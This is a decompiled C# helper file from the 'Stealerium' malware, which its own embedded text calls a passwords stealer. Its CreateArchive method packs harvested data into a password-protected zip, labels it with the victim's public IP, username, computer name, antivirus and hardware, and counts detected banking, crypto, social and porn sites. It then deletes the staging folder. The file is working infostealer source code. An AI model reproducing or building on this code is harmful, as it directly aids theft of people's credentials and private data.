using System;
using System.IO;
using System.Linq;
using System.Text;
using Ionic.Zip;
using Ionic.Zlib;
using Stealerium.Modules.Implant;
using Stealerium.Target.System;

namespace Stealerium.Helpers;

internal sealed class Filemanager
{
	public static void RecursiveDelete(string path)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		if (directoryInfo.Exists)
		{
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			for (int i = 0; i < directories.Length; i++)
			{
				RecursiveDelete(directories[i].FullName);
			}
			directoryInfo.Delete(recursive: true);
		}
	}

	public static void CopyDirectory(string sourceFolder, string destFolder)
	{
		if (!Directory.Exists(destFolder))
		{
			Directory.CreateDirectory(destFolder);
		}
		string[] files = Directory.GetFiles(sourceFolder);
		foreach (string obj in files)
		{
			string fileName = Path.GetFileName(obj);
			string destFileName = Path.Combine(destFolder, fileName);
			File.Copy(obj, destFileName);
		}
		files = Directory.GetDirectories(sourceFolder);
		foreach (string obj2 in files)
		{
			string fileName2 = Path.GetFileName(obj2);
			string destFolder2 = Path.Combine(destFolder, fileName2);
			CopyDirectory(obj2, destFolder2);
		}
	}

	public static long DirectorySize(string path)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		return directoryInfo.GetFiles().Sum((FileInfo fi) => fi.Length) + directoryInfo.GetDirectories().Sum((DirectoryInfo di) => DirectorySize(di.FullName));
	}

	public static string CreateArchive(string directory, bool setpassword = true)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		if (Directory.Exists(directory))
		{
			ZipFile val = new ZipFile(Encoding.UTF8);
			try
			{
				val.set_CompressionLevel((CompressionLevel)9);
				val.set_Comment("\nStealerium v" + Config.Version + " - Passwords stealer coded by Stealerium with Love <3\n\n== System Info ==\nIP: " + SystemInfo.GetPublicIp() + "\nDate: " + SystemInfo.Datenow + "\nUsername: " + SystemInfo.Username + "\nCompName: " + SystemInfo.Compname + "\nLanguage: " + SystemInfo.Culture + "\nAntivirus: " + SystemInfo.GetAntivirus() + "\n\n== Hardware ==\nCPU: " + SystemInfo.GetCpuName() + "\nGPU: " + SystemInfo.GetGpuName() + "\nRAM: " + SystemInfo.GetRamAmount() + "\nPower: " + SystemInfo.GetBattery() + "\nScreen: " + SystemInfo.ScreenMetrics() + "\n\n== Domains ==" + Counter.GetLValue("Banking services", Counter.DetectedBankingServices, '-') + Counter.GetLValue("Cryptocurrency services", Counter.DetectedCryptoServices, '-') + Counter.GetLValue("Social networks", Counter.DetectedSocialServices, '-') + Counter.GetLValue("Porn websites", Counter.DetectedPornServices, '-') + "\n");
				if (setpassword)
				{
					val.set_Password(StringsCrypt.ArchivePassword);
				}
				val.AddDirectory(directory);
				val.Save(directory + ".zip");
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		RecursiveDelete(directory);
		Logging.Log("Archive " + new DirectoryInfo(directory).Name + " compression completed");
		return directory + ".zip";
	}
}
